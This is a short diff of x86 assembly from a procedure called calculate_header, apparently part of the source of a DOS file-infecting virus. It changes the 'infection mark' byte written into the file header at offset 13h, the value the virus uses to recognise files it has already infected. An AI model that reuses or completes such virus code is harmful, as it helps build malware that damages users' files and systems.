@@ -84,7 +84,7 @@ calculate_header proc
     push dx
 
     ; infection mark
-    mov header[13h], '3'
+    mov header[13h], 69h
 
     ; filesize
     mov ax, word ptr file.f_size[0]
